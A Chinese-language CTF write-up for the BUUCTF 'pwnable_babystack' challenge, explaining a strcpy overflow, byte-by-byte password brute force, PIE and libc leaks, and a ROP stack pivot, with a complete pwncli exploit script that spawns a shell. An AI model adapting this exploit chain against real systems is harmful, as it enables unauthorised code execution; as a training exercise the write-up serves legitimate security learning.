# buuctf-pwnable_babystack



### 总结

也不算太`baby`，很有意思的一道题。

<!-- more -->

### checksec

![image-20220405212335829](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405212335829.png)

远程为`libc-2.23.so`。

### 漏洞点

在`check_passwd`分支：

![image-20220405212443172](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405212443172.png)

然后在后面的`strcpy`可以溢出

### 利用思路

最后返回时候存在对`key`的检查，所以需要爆破出`key`。同时，`key`对应的位置也有残留的地址，可以利用`strncmp`爆破出来。

- 爆破`key`
- 泄露`pie`地址
- `rop`+栈迁移

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

context.update(timeout=3)

def check_passwd(data : bytes, clear=False):
    io.sendafter(">> ", "1", timeout=5)
    io.sendafter("Your passowrd :", data, timeout=3)
    m = io.recvline(timeout=5)
    if b"Failed" in m:
        return 0
    elif b"Success" in m:
        if clear:
            io.sendafter(">> ", "1", timeout=5)
        sleep(1)
        return 1
    else:
        print(m)
        error("WTF!")

def copy(data=None):
    sa(">> ", "3")
    if not data:
        data = "#"*0x3f
    sa("Copy :", data)


def brute_passwd(passwd=b"", length=0x10):
    for i in range(length):
        for x in range(1, 0x100):
            if check_passwd(passwd + p8(x)+b"\x00", clear=1):
                passwd += p8(x)
                break
        log_ex(f"current passwd: {passwd}")
    return passwd

"""
1. get passswd
2. get code base 
3. get libc base
4. rop 
"""

# 1. get passswd
ori_passwd = brute_passwd()

# 2. get code base
check_passwd(flat({
    0: "\x00",
    0x3f:"#"
}))

copy()

sa(">> ", "1") # clear
passwd = brute_passwd(b"", length=6)

code_base = u64_ex(passwd) - 0xb70
log_code_base_addr(code_base)

# 0x00000000000010c1: pop rsi; pop r15; ret;
# 0x00000000000010c3: pop rdi; ret; 
# 0x0000000000000bd0: pop rbp; ret; 
# 0x0000000000000d0d: leave; ret;
check_passwd(flat({
    0: "\x00",
    0x40:ori_passwd,
    0x68: code_base + 0xca0 # read_input
}))
copy()

sla(">> ", "2")
sleep(1)
bss_addr = code_base+0x202840
s(flat({
    0: bss_addr,
    0x20: [
        code_base + 0x00000000000010c3, # pop rdi
        code_base + 0x201F60, # puts@got
        code_base+0xae0, # puts@plt
        code_base + 0x00000000000010c3, # pop rdi
        bss_addr, # bss addr,
        code_base + 0x00000000000010c1, 0x400, 0,# pop rsi r15
        code_base + 0xca0, # read_input
        code_base + 0x0000000000000bd0, # pop rbp
        bss_addr, # bss
        code_base+0x0000000000000d0d
    ]
}))


libc_base = recv_current_libc_addr(offset=libc.sym.puts)
log_libc_base_addr(libc_base)
libc.address = libc_base


sleep(1)
s(flat([
    bss_addr+0x200, # rbp
    code_base+0x00000000000010c3,
    libc.search(b"/bin/sh").__next__(),
    libc.sym.system
]))

ia()
```

远程有点问题，经常`IO Error`，本地效果如下：

![image-20220405212833865](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405212833865.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-04-05-buuctf-pwnable-babystack/  

